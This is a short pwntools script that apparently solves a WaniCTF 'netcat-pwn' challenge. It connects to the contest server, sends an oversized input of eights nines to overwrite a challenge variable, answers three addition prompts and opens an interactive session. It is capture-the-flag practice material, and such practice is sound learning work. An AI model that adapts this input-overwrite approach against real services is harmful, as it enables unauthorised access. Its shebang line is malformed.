#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
io = remote('netcat-pwn.wanictf.org', 9002)
context.log_level = 'debug'
context.timeout = 2


# =========================================================
#                         EXPLOITS
# =========================================================

#overwrite challenge variable
io.recvuntil(b'+---------------------------------------+\n\n')
x = int(io.recvuntil(b' ')[:-1])
print(x)
io.recvuntil(b'+ ')
y = int(io.recvuntil(b' ')[:-1])
print(y)

payload = b'9' * 8

io.sendlineafter(b'= ', payload)

for i in range(3):
    io.recvuntil(b'+---------------------------------------+\n\n')
    x = int(io.recvuntil(b' ')[:-1])
    io.recvuntil(b'+ ')
    y = int(io.recvuntil(b' ')[:-1])
    print(x)
    print(y)

    payload = x + y

    print("x + y =", x + y)

    io.sendlineafter(b'= ', str(payload).encode())

io.interactive()
